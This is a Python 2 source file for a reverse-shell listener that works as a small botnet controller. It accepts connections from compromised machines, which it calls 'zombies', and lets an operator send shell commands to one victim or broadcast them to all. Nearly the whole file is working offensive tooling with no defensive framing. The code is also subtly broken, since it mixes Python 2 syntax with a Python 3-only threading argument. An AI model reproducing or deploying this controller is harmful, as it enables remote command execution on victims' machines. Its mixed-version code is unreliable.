#!/usr/bin/env python
# -*- coding: utf-8 -*-

import socket
import threading
import Queue  # Python 2 queue module
import signal
import sys
import time

class ReverseShellListener:
    def __init__(self, host=None, port=None):
        self.host = host if host else self.get_local_ip()
        self.port = port
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.zombies = []
        self.zombie_lock = threading.Lock()
        self.shutdown_flag = False

        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

    def start(self):
        try:
            if self.port is None:
                # Let OS choose a free port
                self.server.bind((self.host, 0))  
                # After binding, get the port that was assigned by the OS
                self.port = self.server.getsockname()[1]
            else:
                self.server.bind((self.host, self.port))

            self.server.listen(5)
            print "[+] Listening on {}:{}".format(self.host, self.port)  # Python 2.x print syntax

            accept_thread = threading.Thread(target=self.accept_connections)
            accept_thread.daemon = True
            accept_thread.start()

            self.main_menu()

        except Exception as e:
            print "[!] Error starting listener: {}".format(e)
        finally:
            self.cleanup()

    def get_local_ip(self):
        # Auto-detect local IP address
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(0)
        try:
            s.connect(("8.8.8.8", 80))  # Try to connect to Google's DNS
            local_ip = s.getsockname()[0]
        except Exception:
            local_ip = "0.0.0.0"  # Fallback IP if no connection
        finally:
            s.close()
        return local_ip

    def accept_connections(self):
        while not self.shutdown_flag:
            try:
                client_sock, addr = self.server.accept()
                client_addr = "{}:{}".format(addr[0], addr[1])

                with self.zombie_lock:
                    zombie_id = len(self.zombies) + 1
                    zombie = {
                        "id": zombie_id,
                        "socket": client_sock,
                        "address": client_addr,
                        "thread": None,
                        "queue": Queue.Queue(),
                        "active": True
                    }
                    self.zombies.append(zombie)

                print "[+] New zombie connected: #{} [{}]".format(zombie_id, client_addr)

                handler = threading.Thread(
                    target=self.handle_zombie,
                    args=(zombie,),
                    daemon=True
                )
                handler.start()
                zombie["thread"] = handler

            except Exception as e:
                if not self.shutdown_flag:
                    print "[!] Accept error: {}".format(e)

    def handle_zombie(self, zombie):
        try:
            while zombie["active"] and not self.shutdown_flag:
                try:
                    cmd = zombie["queue"].get_nowait()
                    if cmd == "disconnect":
                        zombie["active"] = False
                        break

                    zombie["socket"].sendall(cmd.encode("utf-8") + b"\r\n")
                    response = self.receive_from_zombie(zombie["socket"])
                    print response

                    zombie["queue"].task_done()

                except Queue.Empty:
                    time.sleep(0.1)

        except Exception as e:
            print "[!] Error handling zombie #{}: {}".format(zombie["id"], e)
        finally:
            self.disconnect_zombie(zombie)

    def receive_from_zombie(self, sock):
        buffer_size = 4096
        data = b""
        try:
            while True:
                chunk = sock.recv(buffer_size)
                if not chunk:
                    break
                data += chunk
                if b"$ " in chunk or b"> " in chunk:
                    break
        except Exception as e:
            print "[!] Receive error: {}".format(e)

        try:
            return data.decode("utf-8", errors="replace")
        except Exception:
            return data.encode("hex")  # Python 2 hex encode

    def disconnect_zombie(self, zombie):
        try:
            zombie["socket"].shutdown(socket.SHUT_RDWR)
            zombie["socket"].close()
        except Exception:
            pass

        with self.zombie_lock:
            if zombie in self.zombies:
                print "[-] Disconnected zombie #{} [{}]".format(zombie["id"], zombie["address"])
                self.zombies.remove(zombie)

    def main_menu(self):
        while not self.shutdown_flag:
            print "\n--- Main Menu ---"
            print "1. List zombies"
            print "2. Interact with a zombie"
            print "3. Send command to all zombies"
            print "4. Disconnect a zombie"
            print "5. Exit"

            choice = raw_input("\nEnter option: ").strip()  # raw_input() in Python 2

            if choice == "1":
                self.list_zombies()
            elif choice == "2":
                self.interact_with_zombie()
            elif choice == "3":
                self.broadcast_command()
            elif choice == "4":
                self.disconnect_selected_zombie()
            elif choice == "5":
                self.shutdown_flag = True
                print "\nExiting... Please wait for clean shutdown."
                break
            else:
                print "[!] Invalid option"

    def list_zombies(self):
        print "\n--- Connected Zombies ---"
        with self.zombie_lock:
            if not self.zombies:
                print "No active zombies"
            else:
                print "Total zombies: {}".format(len(self.zombies))
                for zombie in self.zombies:
                    status = "[ACTIVE]" if zombie["active"] else "[DISCONNECTED]"
                    print "#{} {:<10} - {}".format(zombie["id"], status, zombie["address"])

    def interact_with_zombie(self):
        try:
            zombie_id = int(raw_input("\nEnter zombie ID to interact with: "))  # raw_input()
            with self.zombie_lock:
                for zombie in self.zombies:
                    if zombie["id"] == zombie_id:
                        if not zombie["active"]:
                            print "[!] This zombie is inactive"
                            return

                        print "\nInteracting with zombie #{}".format(zombie_id)
                        print "Type 'back' to return to main menu"

                        while not self.shutdown_flag and zombie["active"]:
                            cmd = raw_input("\nZombie#{}> ".format(zombie_id)).strip()
                            if not cmd:
                                continue
                            if cmd.lower() == "back":
                                break
                            zombie["queue"].put(cmd)
                            zombie["queue"].join()
                        break
                else:
                    print "[!] Zombie not found"

        except ValueError:
            print "[!] Please enter a valid number"

    def broadcast_command(self):
        cmd = raw_input("\nEnter command to broadcast: ").strip()  # raw_input()
        if not cmd:
            print "[!] Empty command"
            return

        with self.zombie_lock:
            for zombie in self.zombies:
                if zombie["active"]:
                    zombie["queue"].put(cmd)
                    print "Sent to zombie #{}".format(zombie["id"])

    def disconnect_selected_zombie(self):
        try:
            zombie_id = int(raw_input("\nEnter zombie ID to disconnect: "))  # raw_input()
            with self.zombie_lock:
                for zombie in self.zombies:
                    if zombie["id"] == zombie_id:
                        if zombie["active"]:
                            print "Disconnecting zombie #{}...".format(zombie_id)
                            zombie["queue"].put("disconnect")
                            zombie["queue"].join()
                        else:
                            print "Zombie #{} is already disconnected".format(zombie_id)
                        return
            print "[!] Zombie not found"

        except ValueError:
            print "[!] Please enter a valid number"

    def cleanup(self):
        print "\nCleaning up..."
        self.shutdown_flag = True

        with self.zombie_lock:
            for zombie in self.zombies:
                if zombie["active"]:
                    try:
                        zombie["queue"].put("disconnect")
                        zombie["queue"].join()
                    except Exception:
                        pass

        try:
            self.server.shutdown(socket.SHUT_RDWR)
            self.server.close()
        except Exception:
            pass

        print "Cleanup complete"

    def signal_handler(self, signum, frame):
        print "\nReceived signal {}, shutting down...".format(signum)
        self.shutdown_flag = True

if __name__ == "__main__":
    host = None  # Auto-detect local IP
    port = None  # Auto-detect free port

    listener = ReverseShellListener(host=host, port=port)
    listener.start()
